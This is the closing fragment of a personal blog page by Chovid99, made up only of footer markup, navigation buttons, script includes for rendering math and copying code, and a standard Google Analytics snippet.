            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
